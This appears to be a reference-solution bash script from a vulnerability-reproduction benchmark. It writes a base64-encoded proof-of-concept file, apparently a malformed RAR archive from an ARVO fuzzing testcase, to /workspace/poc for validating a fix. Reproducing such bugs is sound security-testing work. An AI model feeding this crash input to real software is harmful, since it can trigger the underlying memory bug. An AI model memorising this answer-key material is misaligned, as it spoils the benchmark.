#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 637fc844 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
/wAGAAAAAAHuUmFyIRoHAFKhKTtUEADehAAAAAAAAr1QYXohGgcAUqEBIToQAN4pOvr/AAAA4wAAAgAA+gAnAAAAOwADAwMaGhoaFBoaGhoaq6tzqwIaAy8uLi9zRS5FRUVFRUVFRUVFLkUuAwNmHwAAGhoaGhQaGhoaGqurc1X95fzQ0dHRc0UuRUVFRUVFRUVFRS4uRUVhciFSYXIhUkUAAAAaW9QEYXIhUmFyISlhciFSYXIhUmFyIVJhciFSYXIGUmFyIVJhciFSYTkyOTI5MmF6IRoHAFKhASE6EADeciFSYXIhciFSYXIhUmEtIVJhciFSYZferQDeAAAAAPr///9SYXIhGgcAUqEvOhAA3gAAAAD6////UmFyIRoHAFKhATtUEADehAAAAABkAPdQUvYBAAAAAAAAOfr///9SYXIhGgcAUqEBO1QQAN6EUqEBIToQAN4=
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
